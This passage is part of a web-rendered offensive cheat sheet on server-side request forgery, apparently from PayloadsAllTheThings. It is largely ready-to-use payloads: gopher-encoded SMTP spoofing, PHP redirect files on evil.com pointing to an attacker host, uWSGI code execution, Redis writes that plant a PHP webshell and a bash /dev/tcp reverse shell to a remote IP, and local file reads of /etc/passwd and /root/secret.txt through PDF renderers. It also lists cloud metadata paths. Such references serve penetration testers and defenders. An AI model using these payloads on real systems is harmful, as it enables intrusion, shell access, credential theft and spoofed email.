+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dict<span style="color:#960050;background-color:#1e0010">:</span>//&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;port&gt;/d:&lt;word&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;database&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;n&gt;
+</span></span><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=dict<span style="color:#960050;background-color:#1e0010">:</span>//attacker<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11111</span>/
+</span></span></code></pre></div><h3 id="sftp">
+  SFTP
+  <a class="anchor" href="#sftp">#</a>
+</h3>
+<p>A network protocol used for secure file transfer over secure shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=sftp<span style="color:#960050;background-color:#1e0010">:</span>//evil.com<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11111</span>/
+</span></span></code></pre></div><h3 id="tftp">
+  TFTP
+  <a class="anchor" href="#tftp">#</a>
+</h3>
+<p>Trivial File Transfer Protocol, works over UDP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=tftp<span style="color:#960050;background-color:#1e0010">:</span>//evil.com<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">12346</span>/TESTUDPPACKET
+</span></span></code></pre></div><h3 id="ldap">
+  LDAP
+  <a class="anchor" href="#ldap">#</a>
+</h3>
+<p>Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=ldap<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11211</span>/<span style="color:#66d9ef">%</span>0astats<span style="color:#66d9ef">%</span>0aquit
+</span></span></code></pre></div><h3 id="gopher">
+  Gopher
+  <a class="anchor" href="#gopher">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=gopher<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span>/xHELO<span style="color:#66d9ef">%</span>20localhost<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aMAIL<span style="color:#66d9ef">%</span>20FROM<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span>3Chacker@site.com<span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aRCPT<span style="color:#66d9ef">%</span>20TO<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span>3Cvictim@site.com<span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aDATA<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aFrom<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>5BHacker<span style="color:#66d9ef">%</span><span style="color:#ae81ff">5D</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>3Chacker@site.com<span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aTo<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>3Cvictime@site.com<span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aDate<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span>20Tue<span style="color:#66d9ef">%</span>2C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">2015</span><span style="color:#66d9ef">%</span>20Sep<span style="color:#66d9ef">%</span><span style="color:#ae81ff">202017</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">2017</span><span style="color:#66d9ef">%</span>3A20<span style="color:#66d9ef">%</span>3A26<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>-<span style="color:#ae81ff">0400</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aSubject<span style="color:#66d9ef">%</span>3A<span style="color:#66d9ef">%</span>20AH<span style="color:#66d9ef">%</span>20AH<span style="color:#66d9ef">%</span>20AH<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250a<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aYou<span style="color:#66d9ef">%</span>20didn<span style="color:#66d9ef">%</span>27t<span style="color:#66d9ef">%</span>20say<span style="color:#66d9ef">%</span>20the<span style="color:#66d9ef">%</span>20magic<span style="color:#66d9ef">%</span>20word<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">21</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250a<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250a<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250a.<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250aQUIT<span style="color:#66d9ef">%</span><span style="color:#ae81ff">250d</span><span style="color:#66d9ef">%</span>250a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>will make a request like
+</span></span><span style="display:flex;"><span>HELO localhost
+</span></span><span style="display:flex;"><span>MAIL FROM<span style="color:#960050;background-color:#1e0010">:</span>&lt;hacker@site.com&gt;
+</span></span><span style="display:flex;"><span>RCPT TO<span style="color:#960050;background-color:#1e0010">:</span>&lt;victim@site.com&gt;
+</span></span><span style="display:flex;"><span>DATA
+</span></span><span style="display:flex;"><span>From<span style="color:#960050;background-color:#1e0010">:</span> [<span style="color:#66d9ef">Hacker</span>] &lt;hacker@site.com&gt;
+</span></span><span style="display:flex;"><span>To<span style="color:#960050;background-color:#1e0010">:</span> &lt;victime@site.com&gt;
+</span></span><span style="display:flex;"><span>Date<span style="color:#960050;background-color:#1e0010">:</span> Tue, <span style="color:#ae81ff">15</span> Sep <span style="color:#ae81ff">2017</span> <span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span> <span style="color:#ae81ff">-0400</span>
+</span></span><span style="display:flex;"><span>Subject<span style="color:#960050;background-color:#1e0010">:</span> Ah Ah AH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You didn<span style="color:#960050;background-color:#1e0010">&#39;</span>t say the magic word !
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>QUIT
+</span></span></code></pre></div><h4 id="gopher-http">
+  Gopher HTTP
+  <a class="anchor" href="#gopher-http">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//&lt;proxyserver&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>/_GET http<span style="color:#960050;background-color:#1e0010">:</span>//&lt;attacker<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>&gt;/x HTTP/<span style="color:#ae81ff">1.1</span><span style="color:#66d9ef">%</span>0A<span style="color:#66d9ef">%</span>0A
+</span></span><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//&lt;proxyserver&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>/_POST<span style="color:#66d9ef">%</span>20http<span style="color:#960050;background-color:#1e0010">:</span>//&lt;attacker&gt;<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/x<span style="color:#66d9ef">%</span>20HTTP/<span style="color:#ae81ff">1.1</span><span style="color:#66d9ef">%</span>0ACookie<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#66d9ef">%</span>20eatme<span style="color:#66d9ef">%</span>0A<span style="color:#66d9ef">%</span>0AI+am+a+post+body
+</span></span></code></pre></div><h4 id="gopher-smtp---back-connect-to-1337">
+  Gopher SMTP - Back connect to 1337
+  <a class="anchor" href="#gopher-smtp---back-connect-to-1337">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Content</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">evil</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">redirect</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: gopher://hack3r.site:1337/_SSRF%0ATest!&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Now query it.
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">https://example.com/?q=http://evil.com/redirect.php.
+</span></span></span></code></pre></div><h4 id="gopher-smtp---send-a-mail">
+  Gopher SMTP - send a mail
+  <a class="anchor" href="#gopher-smtp---send-a-mail">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Content</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">evil</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">redirect</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>        $commands <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;HELO victim.com&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;MAIL FROM: &lt;admin@victim.com&gt;&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;RCPT To: &lt;sxcurity@oou.us&gt;&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;DATA&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Subject: @sxcurity!&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Corben was here, woot woot!&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;%0A&#39;</span>, $commands);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: gopher://0:25/_&#39;</span><span style="color:#f92672">.</span>$payload);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h3 id="netdoc">
+  Netdoc
+  <a class="anchor" href="#netdoc">#</a>
+</h3>
+<p>Wrapper for Java when your payloads struggle with &ldquo;\n&rdquo; and &ldquo;\r&rdquo; characters.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=netdoc<span style="color:#960050;background-color:#1e0010">:</span>///etc/passwd
+</span></span></code></pre></div><h2 id="ssrf-exploiting-wsgi">
+  SSRF exploiting WSGI
+  <a class="anchor" href="#ssrf-exploiting-wsgi">#</a>
+</h2>
+<p>Exploit using the Gopher protocol, full exploit script available at 
+  <a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/_<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">%</span>1A<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span><span style="color:#66d9ef">%</span>0A<span style="color:#66d9ef">%</span>00UWSGI_FILE<span style="color:#66d9ef">%</span>0C<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span>/tmp/test.py
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Header</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>modifier1</td>
+<td>(1 byte)</td>
+<td>0 (%00)</td>
+</tr>
+<tr>
+<td>datasize</td>
+<td>(2 bytes)</td>
+<td>26 (%1A%00)</td>
+</tr>
+<tr>
+<td>modifier2</td>
+<td>(1 byte)</td>
+<td>0 (%00)</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Variable (UWSGI_FILE)</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>key length</td>
+<td>(2 bytes)</td>
+<td>10</td>
+<td>(%0A%00)</td>
+<td></td>
+</tr>
+<tr>
+<td>key data</td>
+<td>(m bytes)</td>
+<td></td>
+<td>UWSGI_FILE</td>
+<td></td>
+</tr>
+<tr>
+<td>value length</td>
+<td>(2 bytes)</td>
+<td>12</td>
+<td>(%0C%00)</td>
+<td></td>
+</tr>
+<tr>
+<td>value data</td>
+<td>(n bytes)</td>
+<td></td>
+<td>/tmp/test.py</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="ssrf-exploiting-redis">
+  SSRF exploiting Redis
+  <a class="anchor" href="#ssrf-exploiting-redis">#</a>
+</h2>
+<blockquote>
+<p>Redis is a database system that stores everything in RAM</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Getting a webshell</span>
+</span></span><span style="display:flex;"><span>url=dict<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/CONFIG<span style="color:#66d9ef">%</span>20SET<span style="color:#66d9ef">%</span>20dir<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>/var/www/html
+</span></span><span style="display:flex;"><span>url=dict<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/CONFIG<span style="color:#66d9ef">%</span>20SET<span style="color:#66d9ef">%</span>20dbfilename<span style="color:#66d9ef">%</span>20file.php
+</span></span><span style="display:flex;"><span>url=dict<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/SET<span style="color:#66d9ef">%</span>20mykey<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#e6db74">&#34;&lt;\x3Fphp system(</span>$_GET<span style="color:#e6db74">[0])\x3F&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>url=dict<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/SAVE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Getting a PHP reverse shell</span>
+</span></span><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/_config<span style="color:#66d9ef">%</span>20set<span style="color:#66d9ef">%</span>20dir<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2Fvar<span style="color:#66d9ef">%</span>2Fwww<span style="color:#66d9ef">%</span>2Fhtml
+</span></span><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/_config<span style="color:#66d9ef">%</span>20set<span style="color:#66d9ef">%</span>20dbfilename<span style="color:#66d9ef">%</span>20reverse.php
+</span></span><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/_set<span style="color:#66d9ef">%</span>20payload<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">22</span><span style="color:#66d9ef">%</span>3C<span style="color:#66d9ef">%</span>3Fphp<span style="color:#66d9ef">%</span>20shell_exec<span style="color:#66d9ef">%</span><span style="color:#ae81ff">28</span><span style="color:#66d9ef">%</span>27bash<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span>-i<span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">26</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">20</span><span style="color:#66d9ef">%</span>2Fdev<span style="color:#66d9ef">%</span>2Ftcp<span style="color:#66d9ef">%</span>2FREMOTE_IP<span style="color:#66d9ef">%</span>2FREMOTE_PORT<span style="color:#66d9ef">%</span><span style="color:#ae81ff">200</span><span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">261</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">27</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">29</span><span style="color:#66d9ef">%</span>3B<span style="color:#66d9ef">%</span><span style="color:#ae81ff">3F</span><span style="color:#66d9ef">%</span>3E<span style="color:#66d9ef">%</span><span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>gopher<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">6379</span>/_save
+</span></span></code></pre></div><h2 id="ssrf-exploiting-pdf-file">
+  SSRF exploiting PDF file
+  <a class="anchor" href="#ssrf-exploiting-pdf-file">#</a>
+</h2>
+<p>
+  <img src="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png" alt="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Images/SSRF_PDF.png" /></p>
+<p>Example with 
+  <a href="https://www.youtube.com/watch?v=t5fB6OZsR6c&amp;feature=emb_title">WeasyPrint by @nahamsec</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&lt;link rel=attachment href=<span style="color:#e6db74">&#34;file:///root/secret.txt&#34;</span>&gt;
+</span></span></code></pre></div><p>Example with PhantomJS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfil</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>);}
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfil</span>.<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;failed!&#39;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h2 id="blind-ssrf">
+  Blind SSRF
+  <a class="anchor" href="#blind-ssrf">#</a>
+</h2>
+<blockquote>
+<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.</p>
+</blockquote>
+<p>Use an SSRF chain to gain an Out-of-Band output.</p>
+<p>From 
+  <a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a> / 
+  <a href="https://github.com/assetnote/blind-ssrf-chains">https://github.com/assetnote/blind-ssrf-chains</a></p>
+<p><strong>Possible via HTTP(s)</strong></p>
+<ul>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#elasticsearch">Elasticsearch</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#weblogic">Weblogic</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#consul">Hashicorp Consul</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#shellshock">Shellshock</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#druid">Apache Druid</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#solr">Apache Solr</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#peoplesoft">PeopleSoft</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#struts">Apache Struts</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#jboss">JBoss</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#confluence">Confluence</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#jira">Jira</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#atlassian-products">Other Atlassian Products</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#opentsdb">OpenTSDB</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#jenkins">Jenkins</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#hystrix">Hystrix Dashboard</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#w3">W3 Total Cache</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#docker">Docker</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#redisexporter">Gitlab Prometheus Redis Exporter</a></li>
+</ul>
+<p><strong>Possible via Gopher</strong></p>
+<ul>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#redis">Redis</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#memcache">Memcache</a></li>
+<li>
+  <a href="https://github.com/assetnote/blind-ssrf-chains#tomcat">Apache Tomcat</a></li>
+</ul>
+<h2 id="ssrf-to-xss">
+  SSRF to XSS
+  <a class="anchor" href="#ssrf-to-xss">#</a>
+</h2>
+<p>by 
+  <a href="https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158">@D0rkerDevil &amp; @alyssa.o.herrera</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://brutelogic.com.br/poc.svg -&gt; simple alert
+</span></span><span style="display:flex;"><span>https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri<span style="color:#f92672">=</span> -&gt; simple ssrf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri<span style="color:#f92672">=</span>http://brutelogic.com.br/poc.svg
+</span></span></code></pre></div><h2 id="ssrf-from-xss">
+  SSRF from XSS
+  <a class="anchor" href="#ssrf-from-xss">#</a>
+</h2>
+<h3 id="using-an-iframe">
+  Using an iframe
+  <a class="anchor" href="#using-an-iframe">#</a>
+</h3>
+<p>The content of the file will be integrated inside the PDF as an image or text.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;echopwn&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;document.write(&#39;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#39;)&#34;</span>/&gt;
+</span></span></code></pre></div><h3 id="using-an-attachment">
+  Using an attachment
+  <a class="anchor" href="#using-an-attachment">#</a>
+</h3>
+<p>Example of a PDF attachment using HTML</p>
+<ol>
+<li>use <code>&lt;link rel=attachment href=&quot;URL&quot;&gt;</code> as Bio text</li>
+<li>use &lsquo;Download Data&rsquo; feature to get PDF</li>
+<li>use <code>pdfdetach -saveall filename.pdf</code> to extract embedded resource</li>
+<li><code>cat attachment.bin</code></li>
+</ol>
+<h2 id="ssrf-url-for-cloud-instances">
+  SSRF URL for Cloud Instances
+  <a class="anchor" href="#ssrf-url-for-cloud-instances">#</a>
+</h2>
+<h3 id="ssrf-url-for-aws-bucket">
+  SSRF URL for AWS Bucket
+  <a class="anchor" href="#ssrf-url-for-aws-bucket">#</a>
+</h3>
+<p>
+  <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories">Docs</a>
+Interesting path to look for at <code>http://169.254.169.254</code> or <code>http://instance-data</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Always here <span style="color:#960050;background-color:#1e0010">:</span> /latest/meta-data/{hostname,public-ipv4,...}
